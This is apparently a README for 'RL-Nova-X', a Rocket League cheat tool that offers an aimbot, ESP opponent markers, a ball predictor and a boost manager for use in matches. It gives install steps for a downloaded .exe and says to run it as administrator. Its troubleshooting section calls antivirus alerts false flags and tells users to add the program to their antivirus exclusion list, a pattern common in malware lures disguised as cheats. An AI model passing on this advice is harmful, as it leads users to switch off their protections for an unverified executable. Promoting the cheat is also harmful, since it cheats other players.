📋 Overview

RL-Nova-X provides tools for Rocket League players to improve their performance. The software includes a ball predictor, an aimbot, a boost manager, and ESP features. These tools help you track the ball path, manage your boost resources, and locate opponents during gameplay.

💻 System Requirements

Your computer must meet these requirements to run the software:

  • Operating System: Windows 10 or Windows 11
  • Graphics Card: Dedicated GPU with DirectX 11 support
  • Memory: 8 GB RAM
  • Network: Stable internet connection
  • Access: Administrator permissions on your Windows account

🛠️ Installation and Setup

Follow these steps to get the software on your system:

  1. Visit the official releases page.
  2. Find the section marked "Assets" at the bottom of the latest release.
  3. Click the file ending in .exe to start the download.
  4. Locate the downloaded file in your Downloads folder.
  5. Double-click the file to open the installer.
  6. Follow the screen prompts to complete the installation.
  7. Launch the program using the desktop shortcut.

🎮 Using the Features

Once you open the software, a menu appears over your game. Use the provided hotkeys to toggle features:

  • Ball Predictor: Shows the calculated path of the ball.
  • Aimbot: Assists with shot accuracy in training and matches.
  • Boost Manager: Tracks your current boost count and availability.
  • ESP: Displays location markers for other players.

⚙️ Configuration

You can adjust the software settings via the settings panel. Open the interface while in the game lobby. Adjust the sensitivity or toggle individual features off if you prefer a simpler interface. Changes save automatically when you close the settings window.

⚠️ Troubleshooting

If the program fails to launch, check your antivirus settings. Sometimes security software flags new applications incorrectly. Add the folder containing the program to your antivirus exclusion list. Ensure that you run the application with administrator rights by right-clicking the shortcut and selecting "Run as administrator."
